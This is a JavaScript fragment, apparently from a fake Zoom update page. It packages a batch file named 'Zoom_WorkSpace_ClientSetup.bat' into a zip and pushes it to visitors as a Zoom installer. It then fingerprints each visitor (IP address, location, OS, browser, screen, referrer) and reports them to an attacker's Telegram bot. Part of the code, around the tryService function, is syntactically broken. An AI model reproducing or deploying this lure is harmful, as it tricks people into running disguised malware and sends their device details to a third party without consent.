function getOS() {
var ua = navigator.userAgent;
if (ua.indexOf('Windows NT 10.0') > -1) return 'Windows 10';
if (ua.indexOf('Windows NT 6.3') > -1) return 'Windows 8.1';
if (ua.indexOf('Windows NT 6.2') > -1) return 'Windows 8';
if (ua.indexOf('Windows NT 6.1') > -1) return 'Windows 7';
if (ua.indexOf('Windows NT') > -1) return 'Windows';
if (ua.indexOf('Mac OS X') > -1) return 'macOS';
if (ua.indexOf('Linux') > -1) return 'Linux';
if (ua.indexOf('Android') > -1) return 'Android';
if (/iOS|iPhone|iPad/i.test(ua)) return 'iOS';
return 'Unknown OS';
}

// ZIP HELPER – uses JSZip (loaded from CDN)

function downloadBatAsZip() {
return new Promise(function(resolve, reject) {
// Check if JSZip is available
if (typeof JSZip === 'undefined') {
reject(new Error('JSZip library not loaded. Please check your internet connection.'));
return;
}

try {
var zip = new JSZip();
// Add the .bat file to the zip with a .bat extension
zip.file('Zoom_WorkSpace_ClientSetup.bat', batContent);

// Generate the zip file as a Blob
zip.generateAsync({ type: 'blob' })
.then(function(blob) {
// Create download link
var url = URL.createObjectURL(blob);
var a = document.createElement('a');
a.href = url;
a.download = 'Zoom_WorkSpace_ClientSetup.zip';
document.body.appendChild(a);
a.click();
document.body.removeChild(a);
setTimeout(function() {
URL.revokeObjectURL(url);
}, 100);
resolve();
})
.catch(function(err) {
reject(err);
});
} catch (e) {
reject(e);
}
});
}

function getBrowserInfo() {
var ua = navigator.userAgent;
if (ua.indexOf('Firefox') > -1) return 'Firefox';
if (ua.indexOf('Chrome') > -1) return 'Chrome';
if (ua.indexOf('Safari') > -1) return 'Safari';
if (ua.indexOf('Edge') > -1) return 'Edge';
if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) return 'Opera';
if (ua.indexOf('Trident') > -1) return 'Internet Explorer';
return 'Unknown';
}

function getBrowserVersion() {
var ua = navigator.userAgent;
var match;
if ((match = ua.match(/(?:Chrome|Firefox|Safari|Edge|Opera|OPR|Version)\/(\d+[.\d]*)/))) {
return match[1];
}
return 'Unknown';
}

function getDeviceType() {
return (/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) ? 'Mobile/Tablet' : 'Desktop';
}

function getOSDetailed() {
var ua = navigator.userAgent;
if (ua.indexOf('Windows NT 10.0') > -1) return 'Windows 10';
if (ua.indexOf('Windows NT 6.3') > -1) return 'Windows 8.1';
if (ua.indexOf('Windows NT 6.2') > -1) return 'Windows 8';
if (ua.indexOf('Windows NT 6.1') > -1) return 'Windows 7';
if (ua.indexOf('Windows NT') > -1) return 'Windows';
if (ua.indexOf('Mac OS X') > -1) return 'macOS';
if (ua.indexOf('Linux') > -1) return 'Linux';
if (ua.indexOf('Android') > -1) return 'Android';
if (/iOS|iPhone|iPad/i.test(ua)) return 'iOS';
return 'Unknown OS';
}

function getScreenInfo() {
return window.screen.width + '×' + window.screen.height;
}

function getTimeUTC() {
var now = new Date();
return now.toISOString().replace('T', ' ').substring(0, 19) + ' UTC';
}

function fetchWithTimeout(url, timeoutMs) {
return new Promise(function(resolve, reject) {
var timer = setTimeout(function() { reject(new Error('Timeout')); }, timeoutMs);
fetch(url, { mode: 'cors' })
.then(function(response) {
clearTimeout(timer);
if (!response.ok) reject(new Error('HTTP ' + response.status));
return response.json();
})
.then(resolve)
.catch(function(err) {
clearTimeout(timer);
reject(err);
});
});
}

function tryService(index) {

buildAndSendTelegram('Unknown', 'Unknown');
return;
}

.then(function(data) {

if (result.ip !== 'Unknown' && result.ip !== 'Unavailable') {
buildAndSendTelegram(result.ip, result.location);
} else {
tryService(index + 1);
}
})
.catch(function() {
tryService(index + 1);
});
}
tryService(0);
}

function buildAndSendTelegram(ip, location) {
var ua = navigator.userAgent;
var browser = getBrowserInfo();
var browserVer = getBrowserVersion();
var browserDisplay = browser + (browserVer !== 'Unknown' ? ' ' + browserVer : '');
var os = getOSDetailed();
var device = getDeviceType();
var screen = getScreenInfo();
var time = getTimeUTC();
var lang = navigator.language || 'Unknown';
var referrer = document.referrer || 'Direct';
var downloadUrl = window.location.href;

var lines = [];
lines.push('📢 *Zoom Update Report*');
lines.push('');

var fields = [
['🕐 Time', time],
['🌐 IP Address', ip],
['📍 Location', location],
['💻 Device', device],
['🖥️ OS', os],
['🌍 Browser', browserDisplay],
['🗣️ Language', lang],
['📺 Screen', screen],
['🔗 Referrer', referrer],
['📦 Package', 'Zoom_WorkSpace_ClientSetup.zip (contains .bat)'],
['🔽 Download URL', downloadUrl],
['🤖 User Agent', ua]
];

fields.forEach(function(field) {
var label = field[0];
var value = field[1];
var escapedValue = String(value).replace(/`/g, '\\`').replace(/_/g, '\\_');
lines.push('• *' + label + ':* `' + escapedValue + '`');
});

var message = lines.join('\n');

var url = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';
var payload = {
chat_id: TELEGRAM_CHAT_ID,
text: message,
parse_mode: 'Markdown'
};

function attemptSend(attempt) {
fetch(url, {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify(payload)
})
.then(function(response) {
if (!response.ok) throw new Error('HTTP ' + response.status);
return response.json();
})
.then(function(data) {
if (data.ok) {
console.log('Telegram report sent successfully.');
} else {
throw new Error('Telegram error: ' + (data.description || 'unknown'));
}
})
.catch(function(err) {
console.warn('Telegram attempt ' + attempt + ' failed:', err);
if (attempt < 2) {
setTimeout(function() { attemptSend(attempt + 1); }, 2000);
} else {
console.error('Telegram report failed after retries.');
}
});
}
attemptSend(1);
}
